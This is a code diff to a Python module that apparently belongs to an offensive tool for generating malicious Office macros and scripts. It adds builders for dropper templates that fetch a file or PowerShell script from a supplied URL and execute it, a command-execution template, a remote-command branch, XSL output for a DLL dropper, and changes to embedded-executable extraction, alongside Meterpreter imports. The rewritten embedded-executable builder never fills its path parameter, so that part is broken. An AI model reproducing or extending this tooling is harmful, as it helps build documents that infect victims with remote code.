@@ -8,8 +8,8 @@ import logging
 from modules.mp_module import MpModule
 import vbLib.Meterpreter
 import vbLib.WebMeter
+import vbLib.WscriptExec
 import vbLib.templates
-from common import  utils
 from common.utils import MSTypes
 from collections import OrderedDict
 
@@ -40,25 +40,82 @@ class TemplateToVba(MpModule):
 
 
     
-    def _processEmbedExeTemplate(self):
-        # open file containing template values       
-        cmdFile = self.getCMDFile()
-        if cmdFile is None or cmdFile == "":         
-            extractedFilePath = utils.randomAlpha(5)+os.path.splitext(self.mpSession.embeddedFilePath)[1]
-        else:
-            f = open(cmdFile, 'r')
-            params = shlex.split(f.read())
-            extractedFilePath = params[0]
-            f.close()
-            
-        logging.info("   [-] Output path when file is extracted: %s" % extractedFilePath)
-
-        content = vbLib.templates.EMBED_EXE
-        content = content.replace("<<<OUT_FILE>>>", extractedFilePath)
+    def _processCmdTemplate(self):
+        """ cmd execute template builder """
+        paramDict = OrderedDict([("cmdline",None)])      
+        self.fillInputParams(paramDict)
+        content = vbLib.templates.CMD
+        content = content.replace("<<<CMD>>>", paramDict["cmdline"])
+        content = content + vbLib.WscriptExec.VBA
         vbaFile = self.addVBAModule(content)
         logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
-        if os.path.isfile(cmdFile):
-            os.remove(cmdFile)
+
+    
+    def _processDropperTemplate(self):
+        """ Generate DROPPER  template for VBA and VBS based """
+        # Get required parameters
+        paramDict = OrderedDict([("target_url",None),("download_path",None)])      
+        self.fillInputParams(paramDict)
+
+        # Add required functions
+        self.addVBAModule(vbLib.WscriptExec.VBA)
+
+        content = vbLib.templates.DROPPER
+        content = content.replace("<<<URL>>>", paramDict["target_url"])
+        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict["download_path"])
+        # generate random file name
+        vbaFile = self.addVBAModule(content)
+        
+        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        logging.info("   [-] OK!")
+    
+    
+    def _processDropper2Template(self):
+        """ Generate DROPPER2 template for VBA and VBS based """
+        # Get required parameters
+        paramDict = OrderedDict([("target_url",None),("download_path",None)])      
+        self.fillInputParams(paramDict)
+
+        # Add required functions
+        self.addVBAModule(vbLib.WscriptExec.VBA)
+
+        content = vbLib.templates.DROPPER2
+        content = content.replace("<<<URL>>>", paramDict["target_url"])
+        content = content.replace("<<<DOWNLOAD_PATH>>>", paramDict["download_path"])
+        # generate random file name
+        vbaFile = self.addVBAModule(content)
+        
+        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        logging.info("   [-] OK!")
+        
+    
+    def _processPowershellDropperTemplate(self):
+        """ Generate  code based on powershell DROPPER template  """
+        # Get required parameters
+        paramDict = OrderedDict([("powershell_script_url",None)])      
+        self.fillInputParams(paramDict)
+
+        # Add required functions
+        self.addVBAModule(vbLib.WscriptExec.VBA)
+
+        content = vbLib.templates.DROPPER_PS
+        content = content.replace("<<<POWERSHELL_SCRIPT_URL>>>", paramDict["powershell_script_url"])
+        # generate random file name
+        vbaFile = self.addVBAModule(content)
+        
+        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
+        logging.info("   [-] OK!")
+    
+    
+    def _processEmbedExeTemplate(self):
+        # Get parameters      
+        paramDict = OrderedDict([("extract_path", None)])  
+        logging.info("   [-] Output path when file is extracted: %s" % paramDict["extract_path"])
+
+        content = vbLib.templates.EMBED_EXE
+        content = content.replace("<<<OUT_FILE>>>", paramDict["extract_path"])
+        vbaFile = self.addVBAModule(content)
+        logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         logging.info("   [-] OK!")
     
     
@@ -68,7 +125,7 @@ class TemplateToVba(MpModule):
         dllUrl=paramDict["URL"] 
         dllFct=paramDict["Dll_Function"]   
 
-        if self.outputFileType in [ MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT]:
+        if self.outputFileType in [ MSTypes.HTA, MSTypes.VBS, MSTypes.WSF, MSTypes.SCT, MSTypes.XSL]:
             # for VBS based file
             content = vbLib.templates.DROPPER_DLL_VBS
             content = content.replace("<<<DLL_URL>>>", dllUrl)
@@ -179,6 +236,7 @@ class TemplateToVba(MpModule):
         vbaFile = self.addVBAModule(content)
         logging.info("   [-] Template %s VBA generated in %s" % (self.template, vbaFile)) 
         
+        
  
     def _generation(self):
         if self.template is None:
@@ -187,11 +245,14 @@ class TemplateToVba(MpModule):
         if self.template == "HELLO":
             content = vbLib.templates.HELLO
         elif self.template == "DROPPER":
-            content = vbLib.templates.DROPPER
+            self._processDropperTemplate()
+            return
         elif self.template == "DROPPER2":
-            content = vbLib.templates.DROPPER2
+            self._processDropper2Template()
+            return
         elif self.template == "DROPPER_PS":
-            content = vbLib.templates.DROPPER_PS
+            self._processPowershellDropperTemplate()
+            return
         elif self.template == "METERPRETER":
             self._processMeterpreterTemplate()
             return
@@ -199,7 +260,10 @@ class TemplateToVba(MpModule):
             self._processWebMeterTemplate()
             return
         elif self.template == "CMD":
-            content = vbLib.templates.CMD
+            self._processCmdTemplate()
+            return
+        elif self.template == "REMOTE_CMD":
+            content = vbLib.templates.REMOTE_CMD
         elif self.template == "EMBED_EXE":
             self._processEmbedExeTemplate()
             return
